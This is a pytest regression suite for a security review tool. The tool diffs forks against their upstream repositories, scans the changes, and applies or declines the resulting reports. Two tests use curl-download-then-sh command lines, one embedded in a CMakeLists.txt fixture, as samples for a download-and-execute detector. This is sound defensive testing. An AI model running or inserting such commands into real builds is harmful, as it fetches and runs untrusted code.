"""Failing-first regressions from audit v7."""

import hashlib
import json
from pathlib import Path

import pytest

from review import apply as review_apply, diff, localdiff, review
from review.scanners import common, osv as osv_scan, plain, semgrep as semgrep_gate


def test_report_exports_added_blocks(tmp_path, monkeypatch):
    import shutil
    import subprocess

    from review import catalog, github

    work = tmp_path / "work"
    bare = tmp_path / "repo.git"
    work.mkdir()
    git = lambda *a: subprocess.run(["git", "-C", str(work), *a], check=True, capture_output=True)
    git("init", "-b", "main")
    git("config", "user.email", "t@e")
    git("config", "user.name", "T")
    (work / "src").mkdir()
    (work / "src/a.py").write_text("def f():\n    return 1\n")
    (work / "requirements.txt").write_text("foo==1.0\n")
    git("add", "."); git("commit", "-m", "base")
    base = subprocess.check_output(["git", "-C", str(work), "rev-parse", "HEAD"]).decode().strip()
    git("checkout", "-b", "fork")
    (work / "src/a.py").write_text("def f():\n    x = 2\n    return x\n")
    (work / "requirements.txt").write_text("foo==1.1\n")
    git("add", "."); git("commit", "-m", "fork")
    fork = subprocess.check_output(["git", "-C", str(work), "rev-parse", "HEAD"]).decode().strip()
    subprocess.run(["git", "clone", "--bare", str(work), str(bare)], check=True, capture_output=True)
    engine = {"id": "synthetic", "repo": "owner/fork", "upstream": "owner/up", "kind": "fork"}
    monkeypatch.setattr(catalog, "load", lambda: {"engine": [engine]})
    monkeypatch.setattr(github, "token", lambda: "t")
    monkeypatch.setattr(github, "fork_head", lambda repo, token: (fork, "fork") if repo == "owner/fork" else (base, "main"))
    monkeypatch.setattr(github, "default_branch", lambda repo, token: "main")
    monkeypatch.setattr(localdiff, "init", lambda target: shutil.copytree(bare, target, dirs_exist_ok=True))
    seen = {}
    real_find_base = localdiff.find_base
    def fake_find_base(*args):
        seen["args"] = args
        return base
    monkeypatch.setattr(localdiff, "find_base", fake_find_base)
    reviews = tmp_path / "reviews"; reviews.mkdir()
    monkeypatch.setattr(review, "REVIEWS", reviews)
    seen_allowed = {}
    monkeypatch.setattr(review.scanners, "osv_scan", lambda manifests, tree, allowed: seen_allowed.update(allowed) or ([], []))
    review.scan("synthetic", 2000, 200000)
    assert seen["args"][-2:] == ("owner/up", "owner/fork")
    assert seen_allowed["requirements.txt"] == {"foo"}
    data = json.loads((reviews / f"synthetic-{fork}.json").read_text())
    assert data["blocks"]
    block = next(item for item in data["blocks"] if item["path"] == "src/a.py")
    assert "x = 2" in block["text"]
    expected = hashlib.sha256((block["path"] + str(block["start"]) + block["text"]).encode()).hexdigest()
    assert block["id"] == expected


def test_gated_report_keeps_other_file_blocks():
    blocks = [{"path": "src/a.py", "start": 1, "end": 2, "text": "x\ny", "id": "i", "context": []}]
    payload = review.gated_payload({"inputs": {}}, "too large to review", {"files": 2}, "src/b.png", blocks)
    assert payload["verdict"] == "too large to review"
    assert payload["blocks"] == blocks
    assert payload["gated_files"] == {"src/b.png": "too large to review"}


def test_removed_entries_keep_dd_content_and_numbers():
    patch = "@@ -1,3 +1,0 @@\n--- a comment\n--i;\n-return 1;\n"
    entries = diff.removed_entries(patch)
    assert entries == [(1, "-- a comment"), (2, "-i;"), (3, "return 1;")]


def test_added_texts_keep_double_plus_content():
    assert diff.added_texts("@@ -0,0 +1,3 @@\n+curl -o /tmp/x u\n+++i;\n+sh /tmp/x\n") == [
        "curl -o /tmp/x u", "++i;", "sh /tmp/x",
    ]


def test_removed_security_lines_are_signals_only():
    patch = "@@ -1,3 +1,2 @@\n-if (x) { return false; }\n-verify_signature(blob);\n+int y;\n"
    findings, signals, removed = plain.scan([], [("src/a.c", patch)], Path("/tmp"), "owner/fork", "up/repo")
    assert not findings
    assert any(row["rule"] == "removed-security-line" for row in signals)
    assert removed and removed[0]["path"] == "src/a.c"


def test_two_step_hint_points_at_the_real_lines(tmp_path):
    path = tmp_path / "CMakeLists.txt"
    text = "int a;\ncurl -s -o /tmp/kp https://x\nint b;\nsh /tmp/kp\n"
    path.write_text(text)
    patch = "@@ -1,4 +1,4 @@\n int a;\n+curl -s -o /tmp/kp https://x\n int b;\n+sh /tmp/kp\n"
    findings, _, _ = plain.scan([path], [("CMakeLists.txt", patch)], tmp_path, "owner/fork", "up/repo")
    row = [item for item in findings if item["rule"] == "download-and-execute"][0]
    assert row["line"] == 2 and "/tmp/kp" in row["snippet"]


def test_osv_unchanged_dependency_is_a_signal(tmp_path, monkeypatch):
    manifest = tmp_path / "requirements.txt"
    manifest.write_text("foo==1.0\n")
    payload = {"results": [{"packages": [{"package": {"name": "foo"}, "vulnerabilities": [{"id": "V", "summary": "s"}]}]}]}
    monkeypatch.setattr(osv_scan, "run_tool", lambda *a, **k: common.ToolResult(1, json.dumps(payload), ""))
    findings, signals = osv_scan.scan([manifest], tmp_path, {"requirements.txt": {"bar"}})
    assert not findings and signals[0]["rule"] == "V"


def test_decline_inserts_under_the_declined_engine(tmp_path, monkeypatch):
    path = tmp_path / "engines.toml"
    path.write_text(
        '[[engine]]\nid = "aaa"\nkind = "fork"\nupstream = "up/a"\nrepo = "o/aaa"\n\n'
        '[[engine]]\nid = "bbb"\nkind = "fork"\nupstream = "up/b"\nrepo = "o/bbb"\n\n'
        '[[engine]]\nid = "ccc"\nkind = "fork"\nupstream = "up/c"\nrepo = "o/ccc"\n'
    )
    reviews = tmp_path / "reviews"; reviews.mkdir()
    sha = "a" * 40
    report = {
        "verdict": "findings: human review needed", "created_at": "2026-01-01T00:00:00Z",
        "inputs": {"commit": sha, "upstream": "up/a", "fork": "o/aaa"}, "findings": [],
    }
    report["findings_digest"] = review_apply.findings_digest(report)
    (reviews / f"aaa-{sha}.json").write_text(json.dumps(report))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    review_apply.apply_review("aaa", path, human_declined=report["findings_digest"], reason="why")
    text = path.read_text()
    aaa = text.split("[[engine]]")[1]
    assert "[engine.review_declined]" in aaa
    assert "[engine.review_declined]" not in text.split("[[engine]]")[-1]


def test_apply_rejects_wrong_report_provenance(tmp_path, monkeypatch):
    path = tmp_path / "engines.toml"
    path.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\n')
    reviews = tmp_path / "reviews"; reviews.mkdir()
    sha = "a" * 40
    report = {
        "verdict": "no findings", "created_at": "2026-01-01T00:00:00Z",
        "inputs": {"commit": sha, "upstream": "evil/repo", "fork": "other/fork"}, "findings": [],
    }
    report["findings_digest"] = review_apply.findings_digest(report)
    (reviews / f"one-{sha}.json").write_text(json.dumps(report))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    with pytest.raises(ValueError):
        review_apply.apply_review("one", path)


def test_apply_rejects_contradictory_verdict(tmp_path, monkeypatch):
    path = tmp_path / "engines.toml"
    path.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\n')
    reviews = tmp_path / "reviews"; reviews.mkdir()
    sha = "a" * 40
    report = {
        "verdict": "no findings", "created_at": "2026-01-01T00:00:00Z",
        "inputs": {"commit": sha, "upstream": "up/repo", "fork": "owner/fork"},
        "findings": [{"file": "a", "line": 1, "rule": "r", "snippet": "x"}],
    }
    report["findings_digest"] = review_apply.findings_digest(report)
    (reviews / f"one-{sha}.json").write_text(json.dumps(report))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    with pytest.raises(ValueError):
        review_apply.apply_review("one", path)
